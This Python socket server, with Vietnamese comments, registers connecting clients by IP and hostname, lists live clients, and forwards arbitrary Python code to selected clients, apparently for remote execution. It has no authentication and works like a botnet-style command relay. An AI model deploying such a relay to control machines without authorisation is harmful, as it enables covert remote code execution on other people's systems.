import socket
import json


sever_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sever_socket.bind(('0.0.0.0', 12345))
sever_socket.listen(100)


info_clients = []
clients = []


while True:
    client_socket, client_address = sever_socket.accept()
  
    
    
    data = client_socket.recv(1024).decode()
    json_data = json.loads(data)
    
    if json_data['cmd'] == 'connect':
        client_socket.sendall(json.dumps({
            'cmd': 'connect',
            'result': 'success'
        }).encode())
    
    if json_data['cmd'] == 'add':
        clients.append(client_socket)
        info_clients.append(json_data['result'])
        
        print('Info:', json_data['result'])
        print('Total clients:', len(clients))
    
    
    if json_data['cmd'] == 'ls_clients':
        # lấy danh sách client còn kết nối
        print('Kiểm tra client còn kết nối')
        for i, client in enumerate(clients):
            try:
                client.sendall(json.dumps({
                    'cmd': 'ping'
                }).encode())
            except:
                clients.pop(i)
                info_clients.pop(i)
        print('Kiểm tra xong có ', len(clients), 'client còn kết nối')
        
        client_socket.sendall(json.dumps({
            'cmd': 'ls_clients',
            'result': info_clients
        }).encode())
        
        print('Đã gửi danh sách client còn kết nối tới máy chủ')
        
        

    if json_data['cmd'] == 'python':
        print('Nhận yêu cầu chạy code từ máy chủ')
        client_run = json_data['clients']
        for client in client_run:
            for i, info_client in enumerate(info_clients):
                if f"{info_client['ip']}:{info_client['hostname']}" == client:
                    clients[i].sendall(json.dumps({
                        'cmd': 'python',
                        'code': json_data['code']
                    }).encode())
                    print('Đã gửi code tới client:', client)
                    break
        
    
    
    
    